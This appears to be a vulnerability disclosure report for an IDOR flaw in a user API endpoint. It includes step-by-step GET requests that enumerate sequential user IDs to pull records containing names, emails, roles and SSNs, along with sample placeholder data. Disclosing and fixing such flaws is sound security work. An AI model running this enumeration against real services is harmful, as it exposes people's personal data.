title: IDOR in User API Endpoint Allows Enumeration of All User Records
vulnerability_information:
## Summary
The REST API endpoint `/api/user/<id>` returns full user details including PII for any user ID without authentication or authorization checks. An attacker can enumerate all user records by iterating through sequential IDs.

## Steps to Reproduce
1. Send a GET request to the API user endpoint:
   ```
   GET /api/user/1
   ```
2. Observe the full user record is returned including name, email, role, and SSN
3. Change the ID to enumerate other users:
   ```
   GET /api/user/2
   GET /api/user/3
   ```
4. Each request returns the complete user record without any auth check

## Proof of Concept
```http
GET /api/user/1 HTTP/1.1
Host: target.com
Accept: application/json
```

Response:
```json
{
  "id": 1,
  "name": "Alice Admin",
  "email": "alice@company.com",
  "role": "admin",
  "ssn": "123-45-6789"
}
```

All user IDs from 1-5 return valid data with SSNs.

## Impact
- Complete exposure of all user PII (names, emails, Social Security Numbers)
- Admin role identification for privilege escalation
- Mass data exfiltration possible via automated enumeration
- Regulatory violations (GDPR, CCPA) due to unprotected PII access
